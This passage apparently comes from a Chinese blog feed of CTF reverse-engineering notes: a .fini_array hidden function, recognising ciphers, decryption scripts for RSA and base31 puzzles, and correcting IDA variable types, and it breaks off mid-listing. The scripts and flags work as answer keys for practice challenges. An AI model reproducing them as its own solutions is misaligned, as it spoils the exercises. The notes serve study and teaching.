        <content type="html"><![CDATA[<h1 id="计算机程序执行">计算机程序执行</h1><h2 id="fini-arry">.fini_arry</h2><p>2023.9.22</p><p>问题来自<code>[2019红帽杯]easyRE</code></p><p>该题中对<code>off_6CC090</code>用十次base64解密出来一个网页作为混淆,向下继续分析发现还有一个<code>byte_6CC0A0</code>开头的数据段,寻找其调用函数发现一个(隐藏的)函数,从此函数中破解出flag(具体见该题WP)</p><p>问题:这个函数没有在main中调用,那么为什么写进来呢—我最后也没弄明白,这函数跑完也啥也没干</p><p>实际发现,这个函数被写入.fini_arry中,在程序结束时进行调用:</p><p>来自https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array的回答:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922151506432.png" alt="image-20230922151506432"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向中加密算法的识别和解密</title>
      <link href="/2023706ab6136d99/"/>
      <url>/2023706ab6136d99/</url>
      
        <content type="html"><![CDATA[<h1 id="加密算法分析">加密算法分析</h1><h2 id="字符对称加密有求模运算">字符对称加密有求模运算</h2><p>如果遇到这种加密,有密文的情况下(当然),可以直接爆破,并且不是把所有的组合都显示出来,直接判断是否和密文相等即可.</p><p>例题-BUUCTF-SimpleRev</p><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">join</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> v2; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> *dest; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    v3 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">    dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v2 + v3 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !dest )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, a1);</span><br><span class="line">    <span class="built_in">strcat</span>(dest, a2);</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// char str2[100] = &#123;0&#125;;</span></span><br><span class="line">    <span class="comment">// char key[100];</span></span><br><span class="line">    <span class="comment">// char *text;</span></span><br><span class="line">    <span class="comment">// char key1[100] = &quot;ADSFK&quot;;</span></span><br><span class="line">    <span class="comment">// char key3[100] = &quot;kills&quot;;</span></span><br><span class="line">    <span class="comment">// char chr; // [rsp+Fh] [rbp-51h]</span></span><br><span class="line">    <span class="comment">// int v2; // [rsp+10h] [rbp-50h]</span></span><br><span class="line">    <span class="comment">// int v3; // [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">    <span class="comment">// int i; // [rsp+18h] [rbp-48h]</span></span><br><span class="line">    <span class="comment">// int v5; // [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">    <span class="comment">// char src[8]; // [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">    <span class="comment">// __int64 v7; // [rsp+28h] [rbp-38h]</span></span><br><span class="line">    <span class="comment">// int v8; // [rsp+30h] [rbp-30h]</span></span><br><span class="line">    <span class="comment">// __int64 v9[2]; // [rsp+40h] [rbp-20h] BYREF</span></span><br><span class="line">    <span class="comment">// int v10; // [rsp+50h] [rbp-10h]</span></span><br><span class="line">    <span class="comment">// unsigned __int64 v11; // [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// *(long long *)src = 0x534C43444ELL;</span></span><br><span class="line">    <span class="comment">// v7 = 0LL;</span></span><br><span class="line">    <span class="comment">// v8 = 0;</span></span><br><span class="line">    <span class="comment">// v9[0] = 0x776F646168LL;</span></span><br><span class="line">    <span class="comment">// v9[1] = 0LL;</span></span><br><span class="line">    <span class="comment">// v10 = 0;</span></span><br><span class="line">    <span class="comment">// text = (char *)join(key3, (char*)v9);</span></span><br><span class="line">    <span class="comment">// strcpy(key, key1);</span></span><br><span class="line">    <span class="comment">// strcat(key, src);</span></span><br><span class="line">    <span class="comment">// v2 = 0;</span></span><br><span class="line">    <span class="comment">// v3 = 0;</span></span><br><span class="line">    <span class="comment">// v5 = strlen(key);</span></span><br><span class="line">    <span class="comment">// for ( i = 0; i &lt; v5; ++i ) &#123;</span></span><br><span class="line">    <span class="comment">//     if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;= 90 )</span></span><br><span class="line">    <span class="comment">//         key[i] = key[v3 % v5] + 32;</span></span><br><span class="line">    <span class="comment">//     ++v3;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// printf(&quot;v3=%d v5=%d key=%s\n&quot;, v3, v5, key);</span></span><br><span class="line">    <span class="comment">// printf(&quot;text=%s\n&quot;,text);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">    <span class="type">int</span> v3 = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">10</span>;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;adsfkndcls&quot;</span>; <span class="comment">//上面的处理脚本求出的key</span></span><br><span class="line">    <span class="type">char</span> text[] = <span class="string">&quot;killshadow&quot;</span>; <span class="comment">//上面的处理脚本求出的text</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(key); ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> chr = <span class="string">&#x27;A&#x27;</span>; chr &lt;= <span class="string">&#x27;Z&#x27;</span>; ++chr) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((chr - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> == text[i]) &#123;</span><br><span class="line">                v3++;</span><br><span class="line">                <span class="built_in">putchar</span>(chr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="rsa的判断">RSA的判断</h2><p>见<code>[SUCTF2019]SignIn</code></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922170839398.png" alt="image-20230922170839398"></p><p>根据第20行的求幂并取模,和65537这个数,直接看出是RSA加密,调用python相关库进行求解</p><p>同时结果转换成十六进制数,使用<code>binascii.unhexlify()</code>方法将其转换为字符串</p><p>WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解密脚本</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知公私钥</span></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入密文&#x27;)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 (求逆元)</span></span><br><span class="line">m = gmpy2.powmod(c, d, n)  <span class="comment"># 即m = c^d mod n (求大整数c的d次幂模n取余)</span></span><br><span class="line">flag = <span class="built_in">str</span>(<span class="built_in">hex</span>(m))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(flag).decode())</span><br></pre></td></tr></table></figure><h1 id="数学基础考察">数学基础考察</h1><h2 id="求模逆运算">求模逆运算</h2><p>例题:NSSCTF-[SWPUCTF 2021 新生赛]fakebase</p><p>题目:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"></span><br><span class="line">s_box = <span class="string">&#x27;qwertyuiopasdfghjkzxcvb123456#$&#x27;</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    tmp += <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">ord</span>(i)))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">b1 = <span class="built_in">int</span>(tmp,<span class="number">2</span>)</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> b1//<span class="number">31</span> != <span class="number">0</span>:</span><br><span class="line">    s += s_box[b1%<span class="number">31</span>]</span><br><span class="line">    b1 = b1//<span class="number">31</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = u#k4ggia61egegzjuqz12jhfspfkay</span></span><br></pre></td></tr></table></figure><p>题目考查了取模的逆运算，假设<code>c=a%b</code>已知，<code>c</code>和<code>b</code>，那么a可以得到算式：<code>a=k*b+c</code>。其中<code>k</code>是需要爆破的.</p><p>1.加密时,将flag的每一个字符的8位ASCII码拼接起来,生成一个整数b1,</p><p>然后对b1循环,每次将b1%31作为下标从s_box中找到转换的字符,并拼接到s中,然后b1整除31,以此类推,直到b1为0(?).</p><p>2.解密时,先令b1=0,然后将s逆序,对每一个字符从s_box中找到其下标,依次加入到b1中,然后b1*=31.</p><p>最后能逆向求出前面的b1,然后使用对应的方法转换为字符串即可.</p><p>但是这里有一个问题,那就是flag的第一个字符需要爆破—由于对31求模的运算,我们不知道这个求模究竟减掉了多少个31,也就是说k*31中,我们不知道<code>k</code>的值.</p><p>3.爆破方法:</p><p>因为每次处理的字符都是其ASCII码,不超过128,那么<code>128//31==4</code>,所以爆破范围不超过5,我们直接在外面套一个循环,让b1最开始就等于这个数,内层的循环中的<code>b1 = b1 * 31 + s_box.index(i)</code>第一次执行就会将其乘上k,然后正常处理,输出这次的flag.</p><p>循环5次后,从爆破出来字符串中找到正确的flag(其他的大概率乱码).</p><p>关键在于,第一个字符直接影响到最终的b1的高位(?),进而直接影响到整个flag的解码,而不是仅仅影响第一个字符的解码.</p><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;u#k4ggia61egegzjuqz12jhfspfkay&#x27;</span></span><br><span class="line">s_box = <span class="string">&#x27;qwertyuiopasdfghjkzxcvb123456#$&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    b1 = k</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(s):</span><br><span class="line">        b1 = b1 * <span class="number">31</span> + s_box.index(i)</span><br><span class="line">    b1 = <span class="built_in">str</span>(<span class="built_in">bin</span>(b1))[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(b1)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b1) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        b1 = b1.zfill((<span class="built_in">len</span>(b1) // <span class="number">8</span> + <span class="number">1</span>) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b1), <span class="number">8</span>):</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(b1[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">E:\devtools\CTF\Scripts\python.exe D:\Data\CTF\<span class="keyword">do</span>\test.py </span><br><span class="line">@ôãÂ»qrMñáSø&amp;xØº</span><br><span class="line">ñ¾v^PÌbk¬MÁ;a û</span><br><span class="line">5¢ÜÙoæ«Q¼åwGPJi&lt;</span><br><span class="line">NSSCTF&#123;WHAt_BASe31&#125;</span><br><span class="line">;zù¾</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA反编译的错误代码分析</title>
      <link href="/2023d40c16a2f01b/"/>
      <url>/2023d40c16a2f01b/</url>
      
        <content type="html"><![CDATA[<h1 id="ida变量分析错误">IDA变量分析错误</h1><p>2023.9.15</p><p>使用IDA进行分析时发现一些奇怪的代码,特别是有一些奇怪的指针强转(例如引用char数组的元素时强转为_DWORD*)时要去注意看IDA中变量的类型有无错误,多余,缺失.</p><h2 id="例题1-buuctf-不一样的flag">例题1—BUUCTF-不一样的flag</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IDA 分析出</span></span><br><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">29</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE v7[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &lt; <span class="number">0</span> || *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">49</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意<code>--*(_DWORD *)&amp;v3[25];</code>这行代码<br>实际上存储地图(分析题意得知是一个走迷宫游戏)的只有5x5,也就是0-24的下标.<br>且v3[25]的地址被强转为int*,也就是说原本的v3[25-28]这4个字节其实是一个单独的变量,实际上就是当前所在行row,<br>所以v3的类型应该被改成<code>char v3[25];</code>而不是<code>char v3[29];</code></p><p>注意<code>if ( *(int *)&amp;v3[4 * i + 25] &lt; 0 || *(int *)&amp;v3[4 * i + 25] &gt; 4 )</code>这行代码<br>首先把v4(v3修改后新生成的那个v4)重命名成col,<br>前面把v3[25-28]这4个字节修改成row后变成<code>if ( *(&amp;v4 + i) &lt; 0 || *(&amp;v4 + i) &gt; 4 )</code>,<br>更能看出问题—这个循环只有两次,实际上就是判断row和col两个变量是否 &lt;0 或 &gt;4<br>不过这里是代码分析,并不是变量分析错误的问题</p><p>注意<code>if ( v7[5 * *(_DWORD *)&amp;v3[25] - 41 + v4] == 35 )</code>这行代码<br>有_BYTE v7[12];这个数组,但我们只用了v8的地址,那么再根据这个函数的局部变量分布和5*5的地图这个信息,即:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(...)</span>&#123;</span><br><span class="line">    <span class="type">char</span> v3[<span class="number">25</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF //已修改</span></span><br><span class="line">    <span class="type">int</span> row; <span class="comment">// [esp+30h] [ebp-1Ch] //新生成的int变量</span></span><br><span class="line">    <span class="type">int</span> col; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">    _BYTE v8[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么有4x4+25=41个字节的向前偏移,即v3[25]的25个字节,v4,v5,v6,i的16个字节<br>所以代码可以修改为<code>if ( v7[5 * row + col] == '#' )</code>,实际上就是把v3当做5*5的二维数组来使用<br>这样整个代码就非常清晰了</p><h2 id="例题2-buuctf-actf新生赛2020-easyre">例题2—BUUCTF-[ACTF新生赛2020]easyre</h2><p>这个题一样,能看出来IDA分析的结果中常常有 int和char或其指针反复互相转换使用的代码</p><p>修改前IDA分析出来的结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  _DWORD v5[<span class="number">3</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  _BYTE v6[<span class="number">5</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+2Fh] [ebp-11h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+33h] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+37h] [ebp-9h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+3Bh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="number">65</span> || v6[<span class="number">1</span>] != <span class="number">67</span> || v6[<span class="number">2</span>] != <span class="number">84</span> || v6[<span class="number">3</span>] != <span class="number">70</span> || v6[<span class="number">4</span>] != <span class="number">123</span> || v10 != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = v7;</span><br><span class="line">  v5[<span class="number">1</span>] = v8;</span><br><span class="line">  v5[<span class="number">2</span>] = v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != _data_start__[*((<span class="type">char</span> *)v5 + i) - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过手动修改的结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td 